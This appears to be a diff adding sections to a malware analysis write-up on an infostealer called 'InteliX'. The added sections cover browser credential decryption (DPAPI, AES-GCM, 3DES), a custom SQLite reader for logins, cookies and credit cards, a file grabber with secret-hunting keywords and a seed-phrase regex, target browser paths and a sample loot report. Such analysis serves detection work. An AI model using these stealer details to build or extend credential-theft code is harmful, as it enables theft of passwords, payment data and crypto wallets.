@@ -283,6 +283,329 @@ When any condition is detected, the malware throws an exception and stops execut
 
 ---
 
+## 🔐 Detailed Encryption & Decryption Mechanisms
+
+### 1. DPAPI (Data Protection API)
+
+Uses `CryptUnprotectData` from `Crypt32.dll` to decrypt Windows-protected data:
+
+```csharp
+[DllImport("crypt32.dll", SetLastError = true)]
+public static extern bool CryptUnprotectData(
+    ref DataBlob pDataIn,
+    ref string szDataDescr,
+    ref DataBlob pOptionalEntropy,
+    IntPtr pvReserved,
+    ref CryptprotectPromptstruct pPromptStruct,
+    int dwFlags,
+    ref DataBlob pDataOut);
+```
+
+### 2. AES-GCM-256 (Chromium v10/v20)
+
+Decrypts Chrome/Edge passwords using AES-GCM with master key from Local State:
+
+```csharp
+// Encrypted data structure
+[0-2]   : "v10" or "v20" (version prefix)
+[3-14]  : 12-byte nonce/IV
+[15-n]  : ciphertext
+[n-16:n]: 16-byte authentication tag
+
+// Decryption
+byte[] decrypted = AesGcm256.Decrypt(masterKey, nonce, aad, ciphertext, tag);
+```
+
+### 3. ChaCha20-Poly1305
+
+Supports ChaCha20-Poly1305 decryption for newer browsers:
+
+```csharp
+public static byte[] Decrypt(byte[] key32, byte[] iv12, byte[] ciphertext, byte[] tag, byte[] aad)
+{
+    // Key: 32 bytes
+    // IV: 12 bytes  
+    // Tag: 16 bytes (Poly1305 MAC)
+    // Uses constant-time comparison to prevent timing attacks
+}
+```
+
+### 4. TripleDES-CBC (Firefox/Gecko)
+
+Decrypts Firefox passwords using 3DES-CBC with master key from key4.db/key3.db:
+
+```csharp
+// Parse ASN.1 structure
+Asn1DerObject asn1Object = asn1Der.Parse(encryptedData);
+byte[] iv = asn1Object.Objects[0].Objects[1].Objects[0].Data;
+byte[] ciphertext = asn1Object.Objects[0].Objects[1].Objects[1].Data;
+
+// Decrypt using TripleDES-CBC
+string plaintext = TripleDes.DecryptStringDesCbc(masterKey, ciphertext, iv);
+```
+
+### 5. NSS Decryptor (Firefox Legacy)
+
+Uses NSS (Network Security Services) library to decrypt legacy Firefox data:
+
+```csharp
+if (!NSSDecryptor.Initialize(profile))
+    return;
+string decrypted = NSSDecryptor.Decrypt(encryptedString);
+```
+
+---
+
+## 🗄️ Custom SQLite Parser
+
+The malware implements a **custom SQLite parser** instead of using standard libraries, allowing it to read databases without locking files:
+
+### Parser Structure
+
+```csharp
+public class SqLite
+{
+    private readonly byte[] _fileBytes;
+    private readonly ulong _pageSize;
+    private readonly ulong _dbEncoding;
+    private SqliteMasterEntry[] _masterTableEntries;
+    private TableEntry[] _tableEntries;
+    
+    public SqLite(byte[] basedata)
+    {
+        _fileBytes = basedata;
+        _pageSize = ConvertToULong(16, 2);    // Page size at offset 16
+        _dbEncoding = ConvertToULong(56, 4);  // Encoding at offset 56
+        ReadMasterTable(100L);                // Start at offset 100
+    }
+}
+```
+
+### Tables Read
+
+| Database File | Tables | Data |
+|--------------|--------|------|
+| `Login Data` | `logins` | Username, password, URL |
+| `Cookies` | `cookies` | Name, value, domain, path |
+| `Web Data` | `autofill` | Form data, addresses |
+| `Web Data` | `credit_cards` | Card number, expiry, name |
+| `Web Data` | `token_service` | OAuth tokens |
+| `Ya Passman Data` | `logins` | Yandex passwords |
+| `Ya Credit Cards` | `records` | Yandex credit cards |
+
+---
+
+## 📁 File Grabber & Seed Phrase Hunter
+
+The `Grabber` module searches for sensitive information files across the entire system:
+
+### Search Keywords (35 keywords)
+
+```csharp
+private readonly string[] _keywords = new string[35]
+{
+    "password", "passwd", "pwd", "pass", "login", "user", "username",
+    "account", "mail", "email", "secret", "key", "private", "public",
+    "wallet", "mnemonic", "seed", "recovery", "phrase", "backup",
+    "pin", "auth", "2fa", "token", "apikey", "api_key", "ssh",
+    "cert", "certificate", "crypto", "btc", "eth", "usdt", "ltc", "xmr"
+};
+```
+
+### Seed Phrase Regex Pattern
+
+```csharp
+// Find 12-24 word seed phrases (BIP-39)
+private readonly Regex _seedRegex = new Regex(
+    "^(?:\\s*\\b[a-z]{3,}\\b){12,24}\\s*$",
+    RegexOptions.IgnoreCase | RegexOptions.Multiline | RegexOptions.Compiled);
+```
+
+### File Extensions Scanned
+
+```csharp
+private readonly string[] _seedExtensions = new string[9]
+{
+    ".seed", ".seedphrase", ".mnemonic", ".phrase", ".key",
+    ".secret", ".txt", ".backup", ".wallet"
+};
+```
+
+### Search Paths (19 locations)
+
+- Desktop, Documents, Downloads
+- OneDrive, Dropbox, iCloud Drive, Google Drive, YandexDisk, Mega
+- Evernote, Standard Notes, Joplin
+- Wallets, Keys, Crypto, Backup folders
+
+### Size Limits
+
+```csharp
+private readonly long _sizeMinFile = 120;      // Min: 120 bytes
+private readonly long _sizeLimitFile = 6144;   // Max per file: 6KB
+private readonly long _sizeLimit = 5242880;    // Total: 5MB
+```
+
+---
+
+## 🌐 Complete Browser List (84+ Browsers)
+
+### Chromium-based (66 browsers)
+
+| # | Browser | Path |
+|---|---------|------|
+| 1 | Google Chrome | `\Google\Chrome\User Data` |
+| 2 | Microsoft Edge | `\Microsoft\Edge\User Data` |
+| 3 | Brave | `\BraveSoftware\Brave-Browser\User Data` |
+| 4 | Opera | `\Opera Software\Opera Stable` |
+| 5 | Opera GX | `\Opera Software\Opera GX Stable` |
+| 6 | Vivaldi | `\Vivaldi\User Data` |
+| 7 | Yandex | `\Yandex\YandexBrowser\User Data` |
+| 8 | CocCoc | `\CocCoc\Browser\User Data` |
+| 9 | 360Chrome | `\360Chrome\Chrome\User Data` |
+| 10 | 360Browser | `\360Browser\Browser\User Data` |
+| 11 | CentBrowser | `\CentBrowser\User Data` |
+| 12 | Comodo Dragon | `\Comodo\Dragon\User Data` |
+| 13 | Epic Privacy | `\Epic Privacy Browser\User Data` |
+| 14 | Avast Browser | `\AVAST Software\Browser\User Data` |
+| 15 | CCleaner | `\CCleaner Browser\User Data` |
+| 16 | Torch | `\Torch\User Data` |
+| 17 | Uran | `\uCozMedia\Uran\User Data` |
+| 18 | Iridium | `\Iridium\User Data` |
+| 19 | Maxthon | `\Maxthon\User Data` |
+| 20 | Slimjet | `\Slimjet\User Data` |
+| ... | 46+ others | Various paths |
+
+### Gecko-based (18 browsers)
+
+| # | Browser | Path |
+|---|---------|------|
+| 1 | Firefox | `\Mozilla\Firefox\Profiles` |
+| 2 | Waterfox | `\Waterfox\Profiles` |
+| 3 | Thunderbird | `\Thunderbird\Profiles` |
+| 4 | Pale Moon | `\Moonchild Productions\Pale Moon\Profiles` |
+| 5 | SeaMonkey | `\Mozilla\SeaMonkey\Profiles` |
+| 6 | K-Meleon | `\K-Meleon\Profiles` |
+| 7 | IceDragon | `\Comodo\IceDragon\Profiles` |
+| 8 | Cyberfox | `\8pecxstudios\Cyberfox\Profiles` |
+| 9 | BlackHawk | `\NETGATE Technologies\BlackHawk\Profiles` |
+| 10 | Mypal | `\Mypal\Profiles` |
+| ... | 8+ others | Various paths |
+
+---
+
+## ⚙️ Windows APIs Used
+
+### Process & Memory APIs
+
+```csharp
+[DllImport("psapi.dll")]
+public static extern bool GetProcessMemoryInfo(...);  // Memory stats
+
+[DllImport("psapi.dll")]
+public static extern bool EnumProcesses(...);           // List processes
+
+[DllImport("kernel32.dll")]
+public static extern IntPtr OpenProcess(...);           // Open process handle
+
+[DllImport("kernel32.dll")]
+public static extern bool TerminateProcess(...);        // Kill process
+```
+
+### DPAPI & Cryptography APIs
+
+```csharp
+[DllImport("crypt32.dll")]
+public static extern bool CryptUnprotectData(...);      // Decrypt DPAPI
+
+[DllImport("ncrypt.dll")]
+public static extern int NCryptOpenStorageProvider(...);// CNG provider
+
+[DllImport("ncrypt.dll")]
+public static extern int NCryptDecrypt(...);            // CNG decrypt
+```
+
+### System Information APIs
+
+```csharp
+[DllImport("kernel32.dll")]
+public static extern bool GetVolumeInformation(...);    // Volume info
+
+[DllImport("kernel32.dll")]
+public static extern bool GlobalMemoryStatusEx(...);    // Memory status
+
+[DllImport("user32.dll")]
+public static extern bool EnumDisplayDevices(...);      // Display info
+```
+
+---
+
+## 📊 Report Structure (counter.txt)
+
+The `counter.txt` file created in the ZIP archive has the following structure:
+
+```
+    ____      __       _______  __
+   /  _/___  / /____  / /  _/ |/ /
+   / // __ \/ __/ _ \/ // / |   / 
+ _/ // / / / /_/  __/ // / /   |  
+/___/_/ /_/\__/\___/_/___//_/|_|  
+                                   
+               InteliX by dead artis
+
+[Keys]  [--3--]  [Chrome, Edge, Firefox]
+       [Chrome Profile 1] MasterKey_v10: A1B2C3D4...
+       [Edge Default] MasterKey_v20: E5F6G7H8...
+       [Firefox default] MasterKey_NSS: I9J0K1L2...
+
+[Browsers]  [--2--]  [Chrome, Firefox]
+  - Profile 1
+       [Cookies 156]
+       [Passwords 23]
+       [CreditCards 2]
+       [AutoFill 45]
+       [RestoreToken 3]
+
+[Applications]  [--5--]  [Discord, FileZilla, Telegram, Steam, NordVPN]
+     [Name Discord]
+       - tokens.txt
+       - Local Storage/leveldb/000003.log
+
+[Games]  [--2--]  [Steam, Minecraft]
+     [Name Steam]
+       - config/loginusers.vdf
+       - config/config.vdf
+
+[Messangers]  [--3--]  [Telegram, Discord, Signal]
+     [Name Telegram]
+       - tdata/key_datas
+       - tdata/settings
+
+[Vpns]  [--1--]  [NordVPN]
+     [Name NordVPN]
+       - config.xml
+       - user.config
+
+[CryptoChromium]  [--2--]
+       - MetaMask
+       - Phantom
+
+[CryptoDesktop]  [--3--]  [Exodus, Electrum, Atomic]
+     [Exodus]
+       - exodus.wallet/seed.seco
+     [Electrum]
+       - wallets/default_wallet
+     [Atomic]
+       - Local Storage/leveldb/000005.ldb
+
+[FilesGrabber]  [--15--]
+       - Desktop/backup.txt
+       - Documents/wallet.key
+       - Downloads/seed.txt
+```
+
+---
+
 ## 🛡️ Detection & Prevention
 
 ### IOCs (Indicators of Compromise)
